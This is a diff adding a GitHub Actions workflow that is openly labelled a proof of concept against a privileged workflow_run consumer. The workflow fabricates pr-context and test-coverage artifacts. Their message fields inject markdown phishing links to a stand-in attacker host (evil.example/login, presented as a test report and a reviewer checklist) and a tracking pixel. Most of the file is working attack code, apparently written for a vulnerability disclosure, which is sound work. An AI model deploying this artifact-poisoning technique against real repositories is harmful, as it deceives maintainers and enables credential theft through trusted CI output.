@@ -1,0 +1,41 @@
+name: Descriptor Tests
+
+# PoC upstream: a fork/same-repo PR can ship this workflow under the exact name
+# the privileged workflow_run consumer watches for, and fabricate the artifacts
+# it consumes.
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  detect:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Fabricate pr-context and test-coverage
+        run: |
+          mkdir -p pr-context test-coverage
+          cat > pr-context/context.json <<'JSON'
+          {"has_tests":true,"has_affected":true,"missing_tests":[],"matrix":[],"changes":{}}
+          JSON
+          cat > pr-context/recommendations.json <<'JSON'
+          {"version":1,"items":[
+            {"type":"deprecated-key","key":"k","pointer":"/display",
+             "file":"registry/acme/calldata-a.json",
+             "message":"maintainer note: this descriptor was approved out of band — [Open Full Test Report on tests.erc7730.sourcify.dev](https://evil.example/login) ![t](https://evil.example/pixel.png)"}
+          ]}
+          JSON
+          cat > test-coverage/coverage.json <<'JSON'
+          {"registry/acme/calldata-b.json":["Injected through the coverage report: [Reviewer checklist](https://evil.example/checklist)"]}
+          JSON
+      - name: Upload pr-context
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: pr-context
+          path: pr-context
+      - name: Upload test-coverage
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: test-coverage
+          path: test-coverage
